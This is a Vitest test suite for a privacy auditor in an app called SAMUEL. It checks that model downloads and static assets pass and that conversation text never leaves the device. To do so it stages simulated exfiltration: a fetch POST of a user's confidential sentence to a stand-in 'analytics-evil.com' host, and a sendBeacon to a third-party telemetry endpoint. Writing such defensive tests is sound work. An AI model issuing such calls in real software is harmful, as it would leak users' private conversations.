/**
 * SAMUEL Test Suite - Privacy Verification
 * 
 * Verifies Law 1: "En CONFIDENCIAL, el contenido de la conversación nunca sale del dispositivo."
 * Verifies Privacy ≠ Zero Traffic: Model downloads are allowed; conversation bytes transmitted MUST be 0.
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { privacyAuditor } from '../privacy/privacy-auditor';

describe('PrivacyAuditor & Confidentiality Invariant', () => {
  beforeEach(() => {
    // Setup underlying fetch mock before auditing starts
    window.fetch = vi.fn().mockImplementation(async () => new Response('mock-response'));
    privacyAuditor.clearLog();
    privacyAuditor.clearSensitiveFragments();
    privacyAuditor.startAuditing();
  });

  afterEach(() => {
    privacyAuditor.stopAuditing();
  });

  it('allows model weights downloads and categorizes as APP_MODEL_DOWNLOAD', async () => {
    await window.fetch('https://huggingface.co/mlc-ai/Llama-3.2-1B-Instruct-q4f16_1-MLC/resolve/main/params_shard_0.bin');

    const summary = privacyAuditor.getAuditSummary();
    const records = privacyAuditor.getAuditRecords();

    expect(records.length).toBeGreaterThan(0);
    const modelReq = records.find(r => r.destination.includes('huggingface.co'));
    expect(modelReq).toBeDefined();
    expect(modelReq?.category).toBe('APP_MODEL_DOWNLOAD');
    expect(modelReq?.status).toBe('allowed');
    expect(summary.conversationBytesTransmitted).toBe(0);
    expect(summary.isConfidentialGuaranteed).toBe(true);
  });

  it('allows static local assets and categorizes as STATIC_ASSET', async () => {
    await window.fetch('/src/index.css');

    const records = privacyAuditor.getAuditRecords();
    const staticReq = records.find(r => r.destination === '/src/index.css');
    expect(staticReq).toBeDefined();
    expect(staticReq?.category).toBe('STATIC_ASSET');
  });

  it('strictly BLOCKS and throws if an outbound request contains sensitive conversation text', async () => {
    const confidentialUserThought = 'Siento mucha culpa por haber renunciado a mi empleo anterior';
    
    // Register sensitive fragment from user session
    privacyAuditor.registerSensitiveFragment(confidentialUserThought);

    // Attempt to leak via fetch
    await expect(
      window.fetch('https://api.analytics-evil.com/collect', {
        method: 'POST',
        body: JSON.stringify({ userThought: confidentialUserThought }),
      })
    ).rejects.toThrow(/SAMUEL_PRIVACY_VIOLATION_PREVENTED/);

    const summary = privacyAuditor.getAuditSummary();
    expect(summary.conversationBytesTransmitted).toBe(0);
    expect(summary.isConfidentialGuaranteed).toBe(true);

    const blockedRecords = privacyAuditor.getAuditRecords().filter(r => r.category === 'CONVERSATION_DATA');
    expect(blockedRecords.length).toBe(1);
    expect(blockedRecords[0].status).toBe('blocked');
  });

  it('strictly BLOCKS sendBeacon attempts containing conversation fragments', () => {
    const sensitiveSecret = 'mi secreto que nadie debe saber';
    privacyAuditor.registerSensitiveFragment(sensitiveSecret);

    const result = navigator.sendBeacon(
      'https://telemetry.thirdparty.com/track',
      JSON.stringify({ text: sensitiveSecret })
    );

    expect(result).toBe(false);

    const summary = privacyAuditor.getAuditSummary();
    expect(summary.conversationBytesTransmitted).toBe(0);
  });
});
